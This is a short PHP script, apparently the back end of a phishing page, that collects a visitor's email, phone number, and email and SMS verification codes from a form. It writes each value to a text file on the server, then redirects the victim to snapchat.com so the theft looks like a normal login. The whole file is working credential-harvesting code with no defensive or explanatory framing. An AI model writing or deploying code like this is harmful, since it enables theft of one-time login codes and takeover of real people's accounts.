<?php
error_log('POST DATA: ' . print_r($POST, true));

// pull values from the form safely
$email       = $_POST['email']        ?? '';
$phone       = $_POST['phone']        ?? '';
$email_code  = $_POST['email code']   ?? '';
$sms_code    = $_POST['sms code']     ?? '';

// write email
if (!empty($email)) {
    file_put_contents(__DIR__ . "/emails.txt",
        "Email: " . $email . "\n",
        FILE_APPEND
    );
}

// write phone
if (!empty($phone)) {
    file_put_contents(__DIR__ . "/phones.txt",
        "Phone: " . $phone . "\n",
        FILE_APPEND
    );
}

// write email code
if (!empty($email_code)) {
    file_put_contents(__DIR__ . "/email_codes.txt",
        "Email Code: " . $email_code . "\n",
        FILE_APPEND
    );
}

// write sms code + redirect
if (!empty($sms_code)) {
    file_put_contents(__DIR__ . "/sms_codes.txt",
        "SMS Code: " . $sms_code . "\n",
        FILE_APPEND
    );

    header("Location: https://www.snapchat.com");
    exit;
}

?>
